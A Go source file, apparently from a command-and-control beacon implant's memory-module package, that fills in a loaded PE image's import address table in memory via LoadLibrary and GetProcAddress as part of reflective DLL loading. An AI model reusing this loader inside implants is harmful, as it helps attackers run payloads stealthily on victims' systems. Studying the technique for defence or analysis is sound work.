package buildimporttable

import (
	"unsafe"

	"golang.org/x/sys/windows"

	"orsted/beacon/modules/memorymodule/utils/helper"
	"orsted/beacon/modules/memorymodule/utils/mem"
	"orsted/beacon/modules/memorymodule/utils/memmoduletypes"
)

func FixImportAddressTable(pEntryImportDataDir memmoduletypes.PIMAGE_DATA_DIRECTORY, pBaseAddress uintptr) error {
	importDescriptorAddr := pBaseAddress + uintptr(pEntryImportDataDir.VirtualAddress)
	for {
		importDescriptor := *(*memmoduletypes.IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(importDescriptorAddr))
		if importDescriptor.Name == 0 {
			break
		}
		libraryName := uintptr(importDescriptor.Name) + pBaseAddress
		dllName := windows.BytePtrToString((*byte)(unsafe.Pointer(libraryName)))
		hLibrary, err := windows.LoadLibrary(dllName)
		if err != nil {
            return err
		}
		addr := pBaseAddress + uintptr(importDescriptor.FirstThunk)
		for {
			thunk := (*memmoduletypes.IMAGE_THUNK_DATA)(unsafe.Pointer(addr))
			if thunk.AddressOfData == 0 {
				break
			}
			importByNameAddr := pBaseAddress + uintptr(thunk.AddressOfData)
			importByName := (*memmoduletypes.IMAGE_IMPORT_BY_NAME)(unsafe.Pointer(importByNameAddr))

			functionName := windows.BytePtrToString((*byte)(unsafe.Pointer(&importByName.Name[0])))
			proc, err := windows.GetProcAddress(hLibrary, functionName)
			if err != nil {
                return err
			}
			procBytes := helper.UintptrToBytes(proc)
            mem.Memcpy(unsafe.Pointer(addr), unsafe.Pointer(&procBytes[0]), len(procBytes))
			addr += 0x8

		}
		importDescriptorAddr += 0x14
	}

	return nil
}
